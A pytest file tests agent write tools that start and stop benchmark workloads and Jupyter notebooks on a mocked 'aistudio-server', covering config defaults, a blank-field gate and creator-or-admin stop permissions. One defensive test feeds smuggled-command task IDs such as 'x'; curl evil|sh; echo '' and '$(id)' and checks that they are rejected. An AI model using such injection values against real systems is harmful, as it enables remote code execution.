"""The write tools: config resolution, the blank-field gate, and the calls they make."""

import asyncio
import json

import httpx
import pytest

from app.config import settings
from app.services import request_ctx
from app.tools import actions as A
from app.tools.actions import (
    _blank_fields,
    _resolve_config,
    start_jupyter,
    start_workload,
    stop_workload,
)

# GET /api/v1/models/config as aistudio-server answers it: run config plus licence info.
_CFG_LIVE = {
    "gpu_count": 1, "concurrency": 4, "max_model_len": 2048,
    "enable_optimizations": False, "dataset_path": "", "gated": False,
    "license": "Apache-2.0", "license_url": "", "hf_repo": "",
}
_RUN_CFG = {"gpu_count": 1, "concurrency": 4, "max_model_len": 2048,
            "enable_optimizations": False, "dataset_path": ""}


def test_licence_info_is_not_run_config():
    cfg, unsupported = _resolve_config(_CFG_LIVE)
    assert cfg == _RUN_CFG and unsupported == []


def test_overrides_win_others_default():
    cfg, unsupported = _resolve_config(_CFG_LIVE, gpu_count=4, concurrency=16, max_model_len=None)
    assert (cfg["gpu_count"], cfg["concurrency"], cfg["max_model_len"]) == (4, 16, 2048)
    assert unsupported == []


def test_a_knob_this_model_does_not_expose_is_reported_not_dropped():
    cfg, unsupported = _resolve_config(_CFG_LIVE, precision="fp8")
    assert unsupported == ["precision"] and "precision" not in cfg


# ── the blank-field gate ──
def test_catalog_blank_is_a_request_for_input_not_a_default():
    cfg, _ = _resolve_config(_CFG_LIVE)
    assert _blank_fields(cfg) == ["dataset_path"]


def test_supplying_the_blank_field_clears_the_gate():
    cfg, _ = _resolve_config(_CFG_LIVE, dataset_path="/data/sharegpt.json")
    assert _blank_fields(cfg) == [] and cfg["dataset_path"] == "/data/sharegpt.json"


def test_false_and_zero_are_real_values_not_blanks():
    assert _blank_fields({"enable_optimizations": False, "concurrency": 0}) == []


def test_whitespace_only_counts_as_blank():
    assert _blank_fields({"dataset_path": "   "}) == ["dataset_path"]


# ── the tool calls ──
class _Platform:
    """aistudio-server as the tools see it: records every request, answers from a table."""

    def __init__(self):
        self.requests: list[httpx.Request] = []
        self.answers: dict = {}

    def handler(self, request: httpx.Request) -> httpx.Response:
        self.requests.append(request)
        status, body = self.answers.get((request.method, request.url.path), (404, {"detail": "no route"}))
        return httpx.Response(status, json=body) if body is not None else httpx.Response(status)

    def sent(self, method: str, path: str) -> list[httpx.Request]:
        return [r for r in self.requests if (r.method, r.url.path) == (method, path)]


def _as(sub="alice", role="admin"):
    """Bind the verified caller, as mcp_server._bridge does for a real call."""
    from app.auth import Identity
    return request_ctx.caller.set(Identity(sub=sub, role=role))


@pytest.fixture
def platform(monkeypatch):
    monkeypatch.setattr(settings, "aistudio_api_url", "http://aistudio")
    token = _as()
    yield _platform(monkeypatch)
    request_ctx.caller.reset(token)


def _platform(monkeypatch):
    fake = _Platform()
    real = httpx.AsyncClient

    def client(**kw):
        return real(transport=httpx.MockTransport(fake.handler),
                    **{k: v for k, v in kw.items() if k != "transport"})

    monkeypatch.setattr(A.httpx, "AsyncClient", client)
    return fake


def test_start_workload_sends_what_the_start_route_takes(platform):
    platform.answers = {
        ("GET", "/api/v1/models/config"): (200, {**_CFG_LIVE, "gpu_count": 2}),
        ("POST", "/api/v1/benchmarks/start"): (200, {"status": "success", "task_id": "wl-1"}),
    }
    out = asyncio.run(start_workload.ainvoke({"model": "tinyllama-1.1b-chat", "node_ip": "10.0.0.5",
                                              "dataset_path": "/data/s.json"}))
    assert "STARTED" in out and "wl-1" in out
    (cfg_req,) = platform.sent("GET", "/api/v1/models/config")
    assert cfg_req.url.params["model"] == "tinyllama-1.1b-chat"
    (req,) = platform.sent("POST", "/api/v1/benchmarks/start")
    assert json.loads(req.content) == {"model_name": "tinyllama-1.1b-chat", "node_ips": ["10.0.0.5"],
                                       "config": {**_RUN_CFG, "gpu_count": 2, "dataset_path": "/data/s.json"},
                                       "created_by": "alice"}


def test_start_workload_does_nothing_with_a_blank_required_field(platform):
    platform.answers = {("GET", "/api/v1/models/config"): (200, dict(_CFG_LIVE))}
    out = asyncio.run(start_workload.ainvoke({"model": "tinyllama-1.1b-chat", "node_ip": "10.0.0.5"}))
    assert "dataset_path" in out and "STARTED" not in out
    assert not platform.sent("POST", "/api/v1/benchmarks/start")


def test_a_refusal_from_aistudio_is_reported_not_hidden(platform):
    platform.answers = {
        ("GET", "/api/v1/models/config"): (200, dict(_CFG_LIVE)),
        ("POST", "/api/v1/benchmarks/start"): (422, {"detail": "config.dataset_path is required"}),
    }
    out = asyncio.run(start_workload.ainvoke({"model": "m", "node_ip": "10.0.0.5", "dataset_path": "/d.json"}))
    assert "refused" in out and "422" in out and "STARTED" not in out


def test_start_workload_rejects_jupyter_as_model(platform):
    out = asyncio.run(start_workload.ainvoke({"model": "jupyter", "node_ip": "10.0.0.5"}))
    assert "start_jupyter" in out and not platform.requests


def test_start_jupyter_launches_on_the_node(platform):
    platform.answers = {("POST", "/api/v1/jupyter/launch"):
                        (200, {"status": "accepted", "task_id": "jup-1", "message": "ok"})}
    out = asyncio.run(start_jupyter.ainvoke({"node_ip": "10.0.0.6"}))
    assert "jup-1" in out and "launching" in out
    (req,) = platform.sent("POST", "/api/v1/jupyter/launch")
    assert json.loads(req.content) == {"node_ip": "10.0.0.6", "created_by": "alice"}


def test_start_jupyter_without_a_node_asks(platform):
    out = asyncio.run(start_jupyter.ainvoke({}))
    assert "node" in out.lower() and not platform.requests


def test_stop_workload_deletes_one_runs_results(platform):
    platform.answers = {("DELETE", "/api/v1/benchmarks/wl-20260101-abc123"):
                        (200, {"status": "deleted", "rows_deleted": 3})}
    out = asyncio.run(stop_workload.ainvoke({"task_id": "wl-20260101-abc123"}))
    assert "Deleted" in out and "3 row" in out and "cannot be undone" in out


def test_stop_workload_stops_a_notebook(platform):
    platform.answers = {("DELETE", "/api/v1/jupyter/instances/jup-20260101-abc123"): (204, None)}
    out = asyncio.run(stop_workload.ainvoke({"task_id": "jup-20260101-abc123"}))
    assert "Stopped Jupyter notebook" in out
    assert platform.sent("DELETE", "/api/v1/jupyter/instances/jup-20260101-abc123")


def test_stop_workload_reports_an_unknown_run(platform):
    out = asyncio.run(stop_workload.ainvoke({"task_id": "wl-20260101-abc123"}))
    assert "refused" in out and "404" in out


@pytest.mark.parametrize("bad", ["x'; curl evil|sh; echo '", "wl-1 2", "$(id)", "a\nb", "../all", ""])
def test_a_run_id_that_is_not_one_never_reaches_the_platform(platform, bad):
    out = asyncio.run(stop_workload.ainvoke({"task_id": bad}))
    assert "Deleted" not in out and not platform.requests, out




# ── only the creator or an admin stops a task ──
_JUP = "jup-20260101-abc123"
_WL = "wl-20260101-abc123"


class _Stateful(_Platform):
    """aistudio-server keeping created_by on the workload, as the real routes do."""

    def __init__(self):
        super().__init__()
        self.created_by: dict = {}

    def handler(self, request: httpx.Request) -> httpx.Response:
        self.requests.append(request)
        path, method = request.url.path, request.method
        if (method, path) == ("POST", "/api/v1/jupyter/launch"):
            self.created_by[_JUP] = json.loads(request.content).get("created_by")
            return httpx.Response(200, json={"status": "accepted", "task_id": _JUP, "message": "ok"})
        for task, prefix in ((_JUP, "/api/v1/jupyter/instances/"), (_WL, "/api/v1/benchmarks/")):
            if path == f"{prefix}{task}/status" and task in self.created_by:
                return httpx.Response(200, json={"task_id": task, "state": "READY",
                                                 "created_by": self.created_by[task]})
            if (method, path) == ("DELETE", f"{prefix}{task}") and task in self.created_by:
                self.created_by.pop(task)
                return httpx.Response(200, json={"status": "deleted", "rows_deleted": 1})
        return httpx.Response(404, json={"detail": "Not found"})


@pytest.fixture
def api(monkeypatch):
    monkeypatch.setattr(settings, "aistudio_api_url", "http://aistudio")
    fake = _Stateful()
    real = httpx.AsyncClient
    monkeypatch.setattr(A.httpx, "AsyncClient", lambda **kw: real(
        transport=httpx.MockTransport(fake.handler), **{k: v for k, v in kw.items() if k != "transport"}))
    return fake


def _run_as(sub, role, tool, **args):
    token = _as(sub, role)
    try:
        return asyncio.run(tool.ainvoke(args))
    finally:
        request_ctx.caller.reset(token)


def test_starting_a_task_sends_its_creator(api):
    _run_as("bob", "operator", start_jupyter, node_ip="10.0.0.6")
    assert api.created_by == {_JUP: "bob"}


def test_the_creator_can_stop_their_own_task(api):
    _run_as("bob", "operator", start_jupyter, node_ip="10.0.0.6")
    assert "Stopped" in _run_as("bob", "operator", stop_workload, task_id=_JUP)
    assert _JUP not in api.created_by


def test_another_operator_cannot(api):
    _run_as("bob", "operator", start_jupyter, node_ip="10.0.0.6")
    out = _run_as("carol", "operator", stop_workload, task_id=_JUP)
    assert out.startswith("Refused:") and "started by bob" in out
    assert not api.sent("DELETE", f"/api/v1/jupyter/instances/{_JUP}")


def test_an_admin_can_stop_anyones_task_without_a_lookup(api):
    _run_as("bob", "operator", start_jupyter, node_ip="10.0.0.6")
    assert "Stopped" in _run_as("root", "admin", stop_workload, task_id=_JUP)
    assert not api.sent("GET", f"/api/v1/jupyter/instances/{_JUP}/status")


def test_a_benchmark_runs_creator_is_read_from_its_status_route(api):
    api.created_by[_WL] = "bob"
    assert "Deleted" in _run_as("bob", "operator", stop_workload, task_id=_WL)
    assert api.sent("GET", f"/api/v1/benchmarks/{_WL}/status")


@pytest.mark.parametrize("on_record", [None, "missing"])
def test_a_task_with_no_creator_on_record_is_admin_only(api, on_record):
    if on_record is None:
        api.created_by[_WL] = None            # started through the UI / REST without one
    out = _run_as("bob", "operator", stop_workload, task_id=_WL)
    assert out.startswith("Refused:") and "no creator on record" in out
    assert not api.sent("DELETE", f"/api/v1/benchmarks/{_WL}")


def test_an_unreadable_creator_fails_closed(api, monkeypatch):
    async def down(task_id):
        raise A.platform_api.PlatformApiError("aistudio-server answered 500")
    monkeypatch.setattr(A.platform_api, "workload", down)
    out = _run_as("bob", "operator", stop_workload, task_id=_WL)
    assert out.startswith("Refused:") and "could not read who started" in out and not api.requests


def test_a_refused_stop_is_not_remembered_as_done(api):
    # A refusal is a plain answer, not Done, so it is never replayed as a success.
    out = _run_as("carol", "operator", stop_workload, task_id=_JUP)
    assert not isinstance(out, A.Done)
